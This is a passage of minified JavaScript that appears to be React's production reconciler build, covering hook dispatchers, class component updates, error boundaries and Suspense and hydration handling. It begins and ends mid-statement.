Dr(n,t)?n:to.current===null?!(uo&42)||uo&1073741824&&!(q&261930)?(rc=!0,e.memoizedState=n):(e=mu(),H.lanes|=e,ql|=e,t):(e=bs(e,n,r),Dr(e,t)||(rc=!0),e)}function Ss(e,t,n,r,i){var a=O.p;O.p=a!==0&&8>a?a:8;var o=D.T,s={};D.T=s,Ps(e,!1,t,n);try{var c=i(),l=D.S;l!==null&&l(s,c),typeof c==`object`&&c&&typeof c.then==`function`?Ns(e,t,ya(c,r),pu(e)):Ns(e,t,r,pu(e))}catch(n){Ns(e,t,{then:function(){},status:`rejected`,reason:n},pu())}finally{O.p=a,o!==null&&s.types!==null&&(o.types=s.types),D.T=o}}function Cs(){}function ws(e,t,n,r){if(e.tag!==5)throw Error(i(476));var a=Ts(e).queue;Ss(e,a,t,le,n===null?Cs:function(){return Es(e),n(r)})}function Ts(e){var t=e.memoizedState;if(t!==null)return t;t={memoizedState:le,baseState:le,baseQueue:null,queue:{pending:null,lanes:0,dispatch:null,lastRenderedReducer:Fo,lastRenderedState:le},next:null};var n={};return t.next={memoizedState:n,baseState:n,baseQueue:null,queue:{pending:null,lanes:0,dispatch:null,lastRenderedReducer:Fo,lastRenderedState:n},next:null},e.memoizedState=t,e=e.alternate,e!==null&&(e.memoizedState=t),t}function Es(e){var t=Ts(e);t.next===null&&(t=e.alternate.memoizedState),Ns(e,t.next.queue,{},pu())}function Ds(){return aa(Qf)}function Os(){return Ao().memoizedState}function ks(){return Ao().memoizedState}function As(e){for(var t=e.return;t!==null;){switch(t.tag){case 24:case 3:var n=pu();e=Ka(n);var r=qa(t,e,n);r!==null&&(hu(r,t,n),Ja(r,t,n)),t={cache:da()},e.payload=t;return}t=t.return}}function js(e,t,n){var r=pu();n={lane:r,revertLane:0,gesture:null,action:n,hasEagerState:!1,eagerState:null,next:null},Fs(e)?Is(t,n):(n=oi(e,t,n,r),n!==null&&(hu(n,e,r),Ls(n,t,r)))}function Ms(e,t,n){Ns(e,t,n,pu())}function Ns(e,t,n,r){var i={lane:r,revertLane:0,gesture:null,action:n,hasEagerState:!1,eagerState:null,next:null};if(Fs(e))Is(t,i);else{var a=e.alternate;if(e.lanes===0&&(a===null||a.lanes===0)&&(a=t.lastRenderedReducer,a!==null))try{var o=t.lastRenderedState,s=a(o,n);if(i.hasEagerState=!0,i.eagerState=s,Dr(s,o))return ai(e,t,i,0),G===null&&ii(),!1}catch{}if(n=oi(e,t,i,r),n!==null)return hu(n,e,r),Ls(n,t,r),!0}return!1}function Ps(e,t,n,r){if(r={lane:2,revertLane:dd(),gesture:null,action:r,hasEagerState:!1,eagerState:null,next:null},Fs(e)){if(t)throw Error(i(479))}else t=oi(e,n,r,2),t!==null&&hu(t,e,2)}function Fs(e){var t=e.alternate;return e===H||t!==null&&t===H}function Is(e,t){mo=po=!0;var n=e.pending;n===null?t.next=t:(t.next=n.next,n.next=t),e.pending=t}function Ls(e,t,n){if(n&4194048){var r=t.lanes;r&=e.pendingLanes,n|=r,t.lanes=n,at(e,n)}}var Rs={readContext:aa,use:No,useCallback:bo,useContext:bo,useEffect:bo,useImperativeHandle:bo,useLayoutEffect:bo,useInsertionEffect:bo,useMemo:bo,useReducer:bo,useRef:bo,useState:bo,useDebugValue:bo,useDeferredValue:bo,useTransition:bo,useSyncExternalStore:bo,useId:bo,useHostTransitionStatus:bo,useFormState:bo,useActionState:bo,useOptimistic:bo,useMemoCache:bo,useCacheRefresh:bo};Rs.useEffectEvent=bo;var zs={readContext:aa,use:No,useCallback:function(e,t){return ko().memoizedState=[e,t===void 0?null:t],e},useContext:aa,useEffect:ls,useImperativeHandle:function(e,t,n){n=n==null?null:n.concat([e]),ss(4194308,4,hs.bind(null,t,e),n)},useLayoutEffect:function(e,t){return ss(4194308,4,e,t)},useInsertionEffect:function(e,t){ss(4,2,e,t)},useMemo:function(e,t){var n=ko();t=t===void 0?null:t;var r=e();if(ho){He(!0);try{e()}finally{He(!1)}}return n.memoizedState=[r,t],r},useReducer:function(e,t,n){var r=ko();if(n!==void 0){var i=n(t);if(ho){He(!0);try{n(t)}finally{He(!1)}}}else i=t;return r.memoizedState=r.baseState=i,e={pending:null,lanes:0,dispatch:null,lastRenderedReducer:e,lastRenderedState:i},r.queue=e,e=e.dispatch=js.bind(null,H,e),[r.memoizedState,e]},useRef:function(e){var t=ko();return e={current:e},t.memoizedState=e},useState:function(e){e=Go(e);var t=e.queue,n=Ms.bind(null,H,t);return t.dispatch=n,[e.memoizedState,n]},useDebugValue:_s,useDeferredValue:function(e,t){return bs(ko(),e,t)},useTransition:function(){var e=Go(!1);return e=Ss.bind(null,H,e.queue,!0,!1),ko().memoizedState=e,[!1,e]},useSyncExternalStore:function(e,t,n){var r=H,a=ko();if(F){if(n===void 0)throw Error(i(407));n=n()}else{if(n=t(),G===null)throw Error(i(349));q&127||Bo(r,t,n)}a.memoizedState=n;var o={value:n,getSnapshot:t};return a.queue=o,ls(Ho.bind(null,r,o,e),[e]),r.flags|=2048,as(9,{destroy:void 0},Vo.bind(null,r,o,n,t),null),n},useId:function(){var e=ko(),t=G.identifierPrefix;if(F){var n=ji,r=Ai;n=(r&~(1<<32-Ue(r)-1)).toString(32)+n,t=`_`+t+`R_`+n,n=go++,0<n&&(t+=`H`+n.toString(32)),t+=`_`}else n=yo++,t=`_`+t+`r_`+n.toString(32)+`_`;return e.memoizedState=t},useHostTransitionStatus:Ds,useFormState:es,useActionState:es,useOptimistic:function(e){var t=ko();t.memoizedState=t.baseState=e;var n={pending:null,lanes:0,dispatch:null,lastRenderedReducer:null,lastRenderedState:null};return t.queue=n,t=Ps.bind(null,H,!0,n),n.dispatch=t,[e,t]},useMemoCache:Po,useCacheRefresh:function(){return ko().memoizedState=As.bind(null,H)},useEffectEvent:function(e){var t=ko(),n={impl:e};return t.memoizedState=n,function(){if(W&2)throw Error(i(440));return n.impl.apply(void 0,arguments)}}},Bs={readContext:aa,use:No,useCallback:vs,useContext:aa,useEffect:us,useImperativeHandle:gs,useInsertionEffect:ps,useLayoutEffect:ms,useMemo:ys,useReducer:Io,useRef:os,useState:function(){return Io(Fo)},useDebugValue:_s,useDeferredValue:function(e,t){return xs(Ao(),U.memoizedState,e,t)},useTransition:function(){var e=Io(Fo)[0],t=Ao().memoizedState;return[typeof e==`boolean`?e:Mo(e),t]},useSyncExternalStore:zo,useId:Os,useHostTransitionStatus:Ds,useFormState:ts,useActionState:ts,useOptimistic:function(e,t){return Ko(Ao(),U,e,t)},useMemoCache:Po,useCacheRefresh:ks};Bs.useEffectEvent=fs;var Vs={readContext:aa,use:No,useCallback:vs,useContext:aa,useEffect:us,useImperativeHandle:gs,useInsertionEffect:ps,useLayoutEffect:ms,useMemo:ys,useReducer:Ro,useRef:os,useState:function(){return Ro(Fo)},useDebugValue:_s,useDeferredValue:function(e,t){var n=Ao();return U===null?bs(n,e,t):xs(n,U.memoizedState,e,t)},useTransition:function(){var e=Ro(Fo)[0],t=Ao().memoizedState;return[typeof e==`boolean`?e:Mo(e),t]},useSyncExternalStore:zo,useId:Os,useHostTransitionStatus:Ds,useFormState:is,useActionState:is,useOptimistic:function(e,t){var n=Ao();return U===null?(n.baseState=e,[e,n.queue.dispatch]):Ko(n,U,e,t)},useMemoCache:Po,useCacheRefresh:ks};Vs.useEffectEvent=fs;function Hs(e,t,n,r){t=e.memoizedState,n=n(r,t),n=n==null?t:m({},t,n),e.memoizedState=n,e.lanes===0&&(e.updateQueue.baseState=n)}var Us={enqueueSetState:function(e,t,n){e=e._reactInternals;var r=pu(),i=Ka(r);i.payload=t,n!=null&&(i.callback=n),t=qa(e,i,r),t!==null&&(hu(t,e,r),Ja(t,e,r))},enqueueReplaceState:function(e,t,n){e=e._reactInternals;var r=pu(),i=Ka(r);i.tag=1,i.payload=t,n!=null&&(i.callback=n),t=qa(e,i,r),t!==null&&(hu(t,e,r),Ja(t,e,r))},enqueueForceUpdate:function(e,t){e=e._reactInternals;var n=pu(),r=Ka(n);r.tag=2,t!=null&&(r.callback=t),t=qa(e,r,n),t!==null&&(hu(t,e,n),Ja(t,e,n))}};function Ws(e,t,n,r,i,a,o){return e=e.stateNode,typeof e.shouldComponentUpdate==`function`?e.shouldComponentUpdate(r,a,o):t.prototype&&t.prototype.isPureReactComponent?!Or(n,r)||!Or(i,a):!0}function Gs(e,t,n,r){e=t.state,typeof t.componentWillReceiveProps==`function`&&t.componentWillReceiveProps(n,r),typeof t.UNSAFE_componentWillReceiveProps==`function`&&t.UNSAFE_componentWillReceiveProps(n,r),t.state!==e&&Us.enqueueReplaceState(t,t.state,null)}function Ks(e,t){var n=t;if(`ref`in t)for(var r in n={},t)r!==`ref`&&(n[r]=t[r]);if(e=e.defaultProps)for(var i in n===t&&(n=m({},n)),e)n[i]===void 0&&(n[i]=e[i]);return n}function qs(e){ei(e)}function Js(e){console.error(e)}function Ys(e){ei(e)}function Xs(e,t){try{var n=e.onUncaughtError;n(t.value,{componentStack:t.stack})}catch(e){setTimeout(function(){throw e})}}function Zs(e,t,n){try{var r=e.onCaughtError;r(n.value,{componentStack:n.stack,errorBoundary:t.tag===1?t.stateNode:null})}catch(e){setTimeout(function(){throw e})}}function Qs(e,t,n){return n=Ka(n),n.tag=3,n.payload={element:null},n.callback=function(){Xs(e,t)},n}function $s(e){return e=Ka(e),e.tag=3,e}function ec(e,t,n,r){var i=n.type.getDerivedStateFromError;if(typeof i==`function`){var a=r.value;e.payload=function(){return i(a)},e.callback=function(){Zs(t,n,r)}}var o=n.stateNode;o!==null&&typeof o.componentDidCatch==`function`&&(e.callback=function(){Zs(t,n,r),typeof i!=`function`&&(Y===null?Y=new Set([this]):Y.add(this));var e=r.stack;this.componentDidCatch(r.value,{componentStack:e===null?``:e})})}function tc(e,t,n,r,a){if(n.flags|=32768,typeof r==`object`&&r&&typeof r.then==`function`){if(t=n.alternate,t!==null&&na(t,n,a,!0),n=oo.current,n!==null){switch(n.tag){case 31:case 13:return L===null?Du():n.alternate===null&&Kl===0&&(Kl=3),n.flags&=-257,n.flags|=65536,n.lanes=a,r===Oa?n.flags|=16384:(t=n.updateQueue,t===null?n.updateQueue=new Set([r]):t.add(r),Gu(e,r,a)),!1;case 22:return n.flags|=65536,r===Oa?n.flags|=16384:(t=n.updateQueue,t===null?(t={transitions:null,markerInstances:null,retryQueue:new Set([r])},n.updateQueue=t):(n=t.retryQueue,n===null?t.retryQueue=new Set([r]):n.add(r)),Gu(e,r,a)),!1}throw Error(i(435,n.tag))}return Gu(e,r,a),Du(),!1}if(F)return t=oo.current,t===null?(r!==Vi&&(t=Error(i(423),{cause:r}),Ji(Si(t,n))),e=e.current.alternate,e.flags|=65536,a&=-a,e.lanes|=a,r=Si(r,n),a=Qs(e.stateNode,r,a),Ya(e,a),Kl!==4&&(Kl=2)):(!(t.flags&65536)&&(t.flags|=256),t.flags|=65536,t.lanes=a,r!==Vi&&(e=Error(i(422),{cause:r}),Ji(Si(e,n)))),!1;var o=Error(i(520),{cause:r});if(o=Si(o,n),Ql===null?Ql=[o]:Ql.push(o),Kl!==4&&(Kl=2),t===null)return!0;r=Si(r,n),n=t;do{switch(n.tag){case 3:return n.flags|=65536,e=a&-a,n.lanes|=e,e=Qs(n.stateNode,r,e),Ya(n,e),!1;case 1:if(t=n.type,o=n.stateNode,!(n.flags&128)&&(typeof t.getDerivedStateFromError==`function`||o!==null&&typeof o.componentDidCatch==`function`&&(Y===null||!Y.has(o))))return n.flags|=65536,a&=-a,n.lanes|=a,a=$s(a),ec(a,e,n,r),Ya(n,a),!1}n=n.return}while(n!==null);return!1}var nc=Error(i(461)),rc=!1;function ic(e,t,n,r){t.child=e===null?Ha(t,null,n,r):Va(t,e.child,n,r)}function ac(e,t,n,r,i){n=n.render;var a=t.ref;if(`ref`in r){var o={};for(var s in r)s!==`ref`&&(o[s]=r[s])}else o=r;return ia(t),r=So(e,t,n,o,a,i),s=Eo(),e!==null&&!rc?(Do(e,t,i),kc(e,t,i)):(F&&s&&Pi(t),t.flags|=1,ic(e,t,r,i),t.child)}function oc(e,t,n,r,i){if(e===null){var a=n.type;return typeof a==`function`&&!pi(a)&&a.defaultProps===void 0&&n.compare===null?(t.tag=15,t.type=a,sc(e,t,a,r,i)):(e=gi(n.type,null,r,t,t.mode,i),e.ref=t.ref,e.return=t,t.child=e)}if(a=e.child,!Ac(e,i)){var o=a.memoizedProps;if(n=n.compare,n=n===null?Or:n,n(o,r)&&e.ref===t.ref)return kc(e,t,i)}return t.flags|=1,e=mi(a,r),e.ref=t.ref,e.return=t,t.child=e}function sc(e,t,n,r,i){if(e!==null){var a=e.memoizedProps;if(Or(a,r)&&e.ref===t.ref){if(rc=!1,t.pendingProps=r=a,Ac(e,i))e.flags&131072&&(rc=!0);else return t.lanes=e.lanes,kc(e,t,i)}}return hc(e,t,n,r,i)}function cc(e,t,n,r){var i=r.children,a=e===null?null:e.memoizedState;if(e===null&&t.stateNode===null&&(t.stateNode={_visibility:1,_pendingMarkers:null,_retryCache:null,_transitions:null}),r.mode===`hidden`){if(t.flags&128){if(a=a===null?n:a.baseLanes|n,e!==null){for(r=t.child=e.child,i=0;r!==null;)i=i|r.lanes|r.childLanes,r=r.sibling;r=i&~a}else r=0,t.child=null;return uc(e,t,a,n,r)}if(n&536870912)t.memoizedState={baseLanes:0,cachePool:null},e!==null&&Ca(t,a===null?null:a.cachePool),a===null?io():ro(t,a),z(t);else return r=t.lanes=536870912,uc(e,t,a===null?n:a.baseLanes|n,n,r)}else a===null?(e!==null&&Ca(t,null),io(),B(t)):(Ca(t,a.cachePool),ro(t,a),B(t),t.memoizedState=null);return ic(e,t,i,n),t.child}function lc(e,t){return e!==null&&e.tag===22||t.stateNode!==null||(t.stateNode={_visibility:1,_pendingMarkers:null,_retryCache:null,_transitions:null}),t.sibling}function uc(e,t,n,r,i){var a=Sa();return a=a===null?null:{parent:I._currentValue,pool:a},t.memoizedState={baseLanes:n,cachePool:a},e!==null&&Ca(t,null),io(),z(t),e!==null&&na(e,t,r,!0),t.childLanes=i,null}function dc(e,t){return t=wc({mode:t.mode,children:t.children},e.mode),t.ref=e.ref,e.child=t,t.return=e,t}function fc(e,t,n){return Va(t,e.child,null,n),e=dc(t,t.pendingProps),e.flags|=2,co(t),t.memoizedState=null,e}function pc(e,t,n){var r=t.pendingProps,a=!!(t.flags&128);if(t.flags&=-129,e===null){if(F){if(r.mode===`hidden`)return e=dc(t,r),t.lanes=536870912,lc(null,e);if(so(t),(e=Ri)?(e=rf(e,Bi),e=e!==null&&e.data===`&`?e:null,e!==null&&(t.memoizedState={dehydrated:e,treeContext:ki===null?null:{id:Ai,overflow:ji},retryLane:536870912,hydrationErrors:null},n=yi(e),n.return=t,t.child=n,Li=t,Ri=null)):e=null,e===null)throw Hi(t);return t.lanes=536870912,null}return dc(t,r)}var o=e.memoizedState;if(o!==null){var s=o.dehydrated;if(so(t),a){if(t.flags&256)t.flags&=-257,t=fc(e,t,n);else if(t.memoizedState!==null)t.child=e.child,t.flags|=128,t=null;else throw Error(i(558))}else if(rc||na(e,t,n,!1),a=(n&e.childLanes)!==0,rc||a){if(r=G,r!==null&&(s=ot(r,n),s!==0&&s!==o.retryLane))throw o.retryLane=s,si(e,s),hu(r,e,s),nc;Du(),t=fc(e,t,n)}else e=o.treeContext,Ri=cf(s.nextSibling),Li=t,F=!0,zi=null,Bi=!1,e!==null&&Ii(t,e),t=dc(t,r),t.flags|=4096;return t}return e=mi(e.child,{mode:r.mode,children:r.children}),e.ref=t.ref,t.child=e,e.return=t,e}function mc(e,t){var n=t.ref;if(n===null)e!==null&&e.ref!==null&&(t.flags|=4194816);else{if(typeof n!=`function`&&typeof n!=`object`)throw Error(i(284));(e===null||e.ref!==n)&&(t.flags|=4194816)}}function hc(e,t,n,r,i){return ia(t),n=So(e,t,n,r,void 0,i),r=Eo(),e!==null&&!rc?(Do(e,t,i),kc(e,t,i)):(F&&r&&Pi(t),t.flags|=1,ic(e,t,n,i),t.child)}function gc(e,t,n,r,i,a){return ia(t),t.updateQueue=null,n=wo(t,r,n,i),Co(e),r=Eo(),e!==null&&!rc?(Do(e,t,a),kc(e,t,a)):(F&&r&&Pi(t),t.flags|=1,ic(e,t,n,a),t.child)}function _c(e,t,n,r,i){if(ia(t),t.stateNode===null){var a=ui,o=n.contextType;typeof o==`object`&&o&&(a=aa(o)),a=new n(r,a),t.memoizedState=a.state!==null&&a.state!==void 0?a.state:null,a.updater=Us,t.stateNode=a,a._reactInternals=t,a=t.stateNode,a.props=r,a.state=t.memoizedState,a.refs={},Wa(t),o=n.contextType,a.context=typeof o==`object`&&o?aa(o):ui,a.state=t.memoizedState,o=n.getDerivedStateFromProps,typeof o==`function`&&(Hs(t,n,o,r),a.state=t.memoizedState),typeof n.getDerivedStateFromProps==`function`||typeof a.getSnapshotBeforeUpdate==`function`||typeof a.UNSAFE_componentWillMount!=`function`&&typeof a.componentWillMount!=`function`||(o=a.state,typeof a.componentWillMount==`function`&&a.componentWillMount(),typeof a.UNSAFE_componentWillMount==`function`&&a.UNSAFE_componentWillMount(),o!==a.state&&Us.enqueueReplaceState(a,a.state,null),Qa(t,r,a,i),Za(),a.state=t.memoizedState),typeof a.componentDidMount==`function`&&(t.flags|=4194308),r=!0}else if(e===null){a=t.stateNode;var s=t.memoizedProps,c=Ks(n,s);a.props=c;var l=a.context,u=n.contextType;o=ui,typeof u==`object`&&u&&(o=aa(u));var d=n.getDerivedStateFromProps;u=typeof d==`function`||typeof a.getSnapshotBeforeUpdate==`function`,s=t.pendingProps!==s,u||typeof a.UNSAFE_componentWillReceiveProps!=`function`&&typeof a.componentWillReceiveProps!=`function`||(s||l!==o)&&Gs(t,a,r,o),Ua=!1;var f=t.memoizedState;a.state=f,Qa(t,r,a,i),Za(),l=t.memoizedState,s||f!==l||Ua?(typeof d==`function`&&(Hs(t,n,d,r),l=t.memoizedState),(c=Ua||Ws(t,n,c,r,f,l,o))?(u||typeof a.UNSAFE_componentWillMount!=`function`&&typeof a.componentWillMount!=`function`||(typeof a.componentWillMount==`function`&&a.componentWillMount(),typeof a.UNSAFE_componentWillMount==`function`&&a.UNSAFE_componentWillMount()),typeof a.componentDidMount==`function`&&(t.flags|=4194308)):(typeof a.componentDidMount==`function`&&(t.flags|=4194308),t.memoizedProps=r,t.memoizedState=l),a.props=r,a.state=l,a.context=o,r=c):(typeof a.componentDidMount==`function`&&(t.flags|=4194308),r=!1)}else{a=t.stateNode,Ga(e,t),o=t.memoizedProps,u=Ks(n,o),a.props=u,d=t.pendingProps,f=a.context,l=n.contextType,c=ui,typeof l==`object`&&l&&(c=aa(l)),s=n.getDerivedStateFromProps,(l=typeof s==`function`||typeof a.getSnapshotBeforeUpdate==`function`)||typeof a.UNSAFE_componentWillReceiveProps!=`function`&&typeof a.componentWillReceiveProps!=`function`||(o!==d||f!==c)&&Gs(t,a,r,c),Ua=!1,f=t.memoizedState,a.state=f,Qa(t,r,a,i),Za();var p=t.memoizedState;o!==d||f!==p||Ua||e!==null&&e.dependencies!==null&&ra(e.dependencies)?(typeof s==`function`&&(Hs(t,n,s,r),p=t.memoizedState),(u=Ua||Ws(t,n,u,r,f,p,c)||e!==null&&e.dependencies!==null&&ra(e.dependencies))?(l||typeof a.UNSAFE_componentWillUpdate!=`function`&&typeof a.componentWillUpdate!=`function`||(typeof a.componentWillUpdate==`function`&&a.componentWillUpdate(r,p,c),typeof a.UNSAFE_componentWillUpdate==`function`&&a.UNSAFE_componentWillUpdate(r,p,c)),typeof a.componentDidUpdate==`function`&&(t.flags|=4),typeof a.getSnapshotBeforeUpdate==`function`&&(t.flags|=1024)):(typeof a.componentDidUpdate!=`function`||o===e.memoizedProps&&f===e.memoizedState||(t.flags|=4),typeof a.getSnapshotBeforeUpdate!=`function`||o===e.memoizedProps&&f===e.memoizedState||(t.flags|=1024),t.memoizedProps=r,t.memoizedState=p),a.props=r,a.state=p,a.context=c,r=u):(typeof a.componentDidUpdate!=`function`||o===e.memoizedProps&&f===e.memoizedState||(t.flags|=4),typeof a.getSnapshotBeforeUpdate!=`function`||o===e.memoizedProps&&f===e.memoizedState||(t.flags|=1024),r=!1)}return a=r,mc(e,t),r=!!(t.flags&128),a||r?(a=t.stateNode,n=r&&typeof n.getDerivedStateFromError!=`function`?null:a.render(),t.flags|=1,e!==null&&r?(t.child=Va(t,e.child,null,i),t.child=Va(t,null,n,i)):ic(e,t,n,i),t.memoizedState=a.state,e=t.child):e=kc(e,t,i),e}function vc(e,t,n,r){return Ki(),t.flags|=256,ic(e,t,n,r),t.child}var yc={dehydrated:null,treeContext:null,retryLane:0,hydrationErrors:null};function bc(e){return{baseLanes:e,cachePool:wa()}}function xc(e,t,n){return e=e===null?0:e.childLanes&~n,t&&(e|=Xl),e}function Sc(e,t,n){var r=t.pendingProps,a=!1,o=!!(t.flags&128),s;if((s=o)||(s=e!==null&&e.memoizedState===null?!1:!!(V.current&2)),s&&(a=!0,t.flags&=-129),s=!!(t.flags&32),t.flags&=-33,e===null){if(F){if(a?R(t):B(t),(e=Ri)?(e=rf(e,Bi),e=e!==null&&e.data!==`&`?e:null,e!==null&&(t.memoizedState={dehydrated:e,treeContext:ki===null?null:{id:Ai,overflow:ji},retryLane:536870912,hydrationErrors:null},n=yi(e),n.return=t,t.child=n,Li=t,Ri=null)):e=null,e===null)throw Hi(t);return of(e)?t.lanes=32:t.lanes=536870912,null}var c=r.children;return r=r.fallback,a?(B(t),a=t.mode,c=wc({mode:`hidden`,children:c},a),r=_i(r,a,n,null),c.return=t,r.return=t,c.sibling=r,t.child=c,r=t.child,r.memoizedState=bc(n),r.childLanes=xc(e,s,n),t.memoizedState=yc,lc(null,r)):(R(t),Cc(t,c))}var l=e.memoizedState;if(l!==null&&(c=l.dehydrated,c!==null)){if(o)t.flags&256?(R(t),t.flags&=-257,t=Tc(e,t,n)):t.memoizedState===null?(B(t),c=r.fallback,a=t.mode,r=wc({mode:`visible`,children:r.children},a),c=_i(c,a,n,null),c.flags|=2,r.return=t,c.return=t,r.sibling=c,t.child=r,Va(t,e.child,null,n),r=t.child,r.memoizedState=bc(n),r.childLanes=xc(e,s,n),t.memoizedState=yc,t=lc(null,r)):(B(t),t.child=e.child,t.flags|=128,t=null);else if(R(t),of(c)){if(s=c.nextSibling&&c.nextSibling.dataset,s)var u=s.dgst;s=u,r=Error(i(419)),r.stack=``,r.digest=s,Ji({value:r,source:null,stack:null}),t=Tc(e,t,n)}else if(rc||na(e,t,n,!1),s=(n&e.childLanes)!==0,rc||s){if(s=G,s!==null&&(r=ot(s,n),r!==0&&r!==l.retryLane))throw l.retryLane=r,si(e,r),hu(s,e,r),nc;af(c)||Du(),t=Tc(e,t,n)}else af(c)?(t.flags|=192,t.child=e.child,t=null):(e=l.treeContext,Ri=cf(c.nextSibling),Li=t,F=!0,zi=null,Bi=!1,e!==null&&Ii(t,e),t=Cc(t,r.children),t.flags|=4096);return t}return a?(B(t),c=r.fallback,a=t.mode,l=e.child,u=l.sibling,r=mi(l,{mode:`hidden`,children:r.children}),r.subtreeFlags=l.subtreeFlags&65011712,u===null?(c=_i(c,a,n,null),c.flags|=2):c=mi(u,c),c.return=t,r.return=t,r.sibling=c,t.child=r,lc(null,r),r=t.child,c=e.child.memoizedState,c===null?c=bc(n):(a=c.cachePool,a===null?a=wa():(l=I._currentValue,a=a.parent===l?a:{parent:l,pool:l}),c={baseLanes:c.baseLanes|n,cachePool:a}),r.memoizedState=c,r.childLanes=xc(e,s,n),t.memoizedState=yc,lc(e.child,r)):(R(t),n=e.child,e=n.sibling,n=mi(n,{mode:`visible`,children:r.children}),n.return=t,n.sibling=null,e!==null&&(s=t.deletions,s===null?(t.deletions=[e],t.flags|=16):s.push(e)),t.child=n,t.memoizedState=null,n)}function Cc(e,t){return t=wc({mode:`visible`,children:t},e.mode),t.return=e,e.child=t}function wc(e,t){return e=fi(22,e,null,t),e.lanes=0,e}function Tc(e,t,n){return Va(t,e.child,null,n),e=Cc(t,t.pendingProps.children),e.flags|=2,t.memoizedState=null,e}function Ec(e,t,n){e.lanes|=t;var r=e.alternate;r!==null&&(r.lanes|=t),ea(e.return,t,n)}function Dc(e,t,n,r,i,a){var o=e.memoizedState;o===null?e.memoizedState={isBackwards:t,rendering:null,renderingStartTime:0,last:r,tail:n,tailMode:i,treeForkCount:a}:(o.isBackwards=t,o.rendering=null,o.renderingStartTime=0,o.last=r,o.tail=n,o.tailMode=i,o.treeForkCount=a)}function Oc(e,t,n){var r=t.pendingProps,i=r.revealOrder,a=r.tail;r=r.children;var o=V.current,s=!!(o&2);if(s?(o=o&1|2,t.flags|=128):o&=1,k(V,o),ic(e,t,r,n),r=F?Ei:0,!s&&e!==null&&e.flags&128)a:for(e=t.child;e!==null;){if(e.tag===13)e.memoizedState!==null&&Ec(e,n,t);else if(e.tag===19)Ec(e,n,t);else if(e.child!==null){e.child.return=e,e=e.child;continue}if(e===t)break a;for(;e.sibling===null;){if(e.return===null||e.return===t)break a;e=e.return}e.sibling.return=e.return,e=e.sibling}switch(i){case`forwards`:for(n=t.child,i=null;n!==null;)e=n.alternate,e!==null&&lo(e)===null&&(i=n),n=n.sibling;n=i,n===null?(i=t.child,t.child=null):(i=n.sibling,n.sibling=null),Dc(t,!1,i,n,a,r);break;case`backwards`:case`unstable_legacy-backwards`:for(n=null,i=t.child,t.child=null;i!==null;){if(e=i.alternate,e!==null&&lo(e)===null){t.child=i;break}e=i.sibling,i.sibling=n,n=i,i=e}Dc(t,!0,n,null,a,r);break;case`together`:Dc(t,!1,null,null,void 0,r);break;default:t.memoizedState=null}return t.child}function kc(e,t,n){if(e!==null&&(t.dependencies=e.dependencies),ql|=t.lanes,(n&t.childLanes)===0){if(e!==null){if(na(e,t,n,!1),(n&t.childLanes)===0)return null}else return null}if(e!==null&&t.child!==e.child)throw Error(i(153));if(t.child!==null){for(e=t.child,n=mi(e,e.pendingProps),t.child=n,n.return=t;e.sibling!==null;)e=e.sibling,n=n.sibling=mi(e,e.pendingProps),n.return=t;n.sibling=null}return t.child}function Ac(e,t){return(e.lanes&t)!==0||(e=e.dependencies,!!(e!==null&&ra(e)))}function jc(e,t,n){switch(t.tag){case 3:ve(t,t.stateNode.containerInfo),Qi(t,I,e.memoizedState.cache),Ki();break;case 27:case 5:be(t);break;case 4:ve(t,t.stateNode.containerInfo);break;case 10:Qi(t,t.type,t.memoizedProps.value);break;case 31:if(t.memoizedState!==null)return t.flags|=128,so(t),null;break;case 13:var r=t.memoizedState;if(r!==null)return r.dehydrated===null?(n&t.child.childLanes)===0?(R(t),e=kc(e,t,n),e===null?null:e.sibling):Sc(e,t,n):(R(t),t.flags|=128,null);R(t);break;case 19:var i=!!(e.flags&128);if(r=(n&t.childLanes)!==0,r||=(na(e,t,n,!1),(n&t.childLanes)!==0),i){if(r)return Oc(e,t,n);t.flags|=128}if(i=t.memoizedState,i!==null&&(i.rendering=null,i.tail=null,i.lastEffect=null),k(V,V.current),r)break;return null;case 22:return t.lanes=0,cc(e,t,n,t.pendingProps);case 24:Qi(t,I,e.memoizedState.cache)}return kc(e,t,n)}function Mc(e,t,n){if(e!==null){if(e.memoizedProps!==t.pendingProps)rc=!0;else{if(!Ac(e,n)&&!(t.flags&128))return rc=!1,jc(e,t,n);rc=!!(e.flags&131072)}}else rc=!1,F&&t.flags&1048576&&Ni(t,Ei,t.index);switch(t.lanes=0,t.tag){case 16:a:{var r=t.pendingProps;if(e=ja(t.elementType),t.type=e,typeof e==`function`)pi(e)?(r=Ks(e,r),t.tag=1,t=_c(null,t,e,r,n)):(t.tag=0,t=hc(null,t,e,r,n));else{if(e!=null){var a=e.$$typeof;if(a===C){t.tag=11,t=ac(null,t,e,r,n);break a}if(a===te){t.tag=14,t=oc(null,t,e,r,n);break a}}throw t=se(e)||e,Error(i(306,t,``))}}return t;case 0:return hc(e,t,t.type,t.pendingProps,n);case 1:return r=t.type,a=Ks(r,t.pendingProps),_c(e,t,r,a,n);case 3:a:{if(ve(t,t.stateNode.containerInfo),e===null)throw Error(i(387));r=t.pendingProps;var o=t.memoizedState;a=o.element,Ga(e,t),Qa(t,r,null,n);var s=t.memoizedState;if(r=s.cache,Qi(t,I,r),r!==o.cache&&ta(t,[I],n,!0),Za(),r=s.element,o.isDehydrated){if(o={element:r,isDehydrated:!1,cache:s.cache},t.updateQueue.baseState=o,t.memoizedState=o,t.flags&256){t=vc(e,t,r,n);break a}if(r!==a){a=Si(Error(i(424)),t),Ji(a),t=vc(e,t,r,n);break a}switch(e=t.stateNode.containerInfo,e.nodeType){case 9:e=e.body;break;default:e=e.nodeName===`HTML`?e.ownerDocument.body:e}for(Ri=cf(e.firstChild),Li=t,F=!0,zi=null,Bi=!0,n=Ha(t,null,r,n),t.child=n;n;)n.flags=n.flags&-3|4096,n=n.sibling}else{if(Ki(),r===a){t=kc(e,t,n);break a}ic(e,t,r,n)}t=t.child}return t;case 26:return mc(e,t),e===null?(n=kf(t.type,null,t.pendingProps,null))?t.memoizedState=n:F||(n=t.type,e=t.pendingProps,r=Bd(ge.current).createElement(n),r[N]=t,r[ft]=e,Pd(r,n,e),wt(r),t.stateNode=r):t.memoizedState=kf(t.type,e.memoizedProps,t.pendingProps,e.memoizedState),null;case 27:return be(t),e===null&&F&&(r=t.stateNode=ff(t.type,t.pendingProps,ge.current),Li=t,Bi=!0,a=Ri,Zd(t.type)?(lf=a,Ri=cf(r.firstChild)):Ri=a),ic(e,t,t.pendingProps.children,n),mc(e,t),e===null&&(t.flags|=4194304),t.child;case 5:return 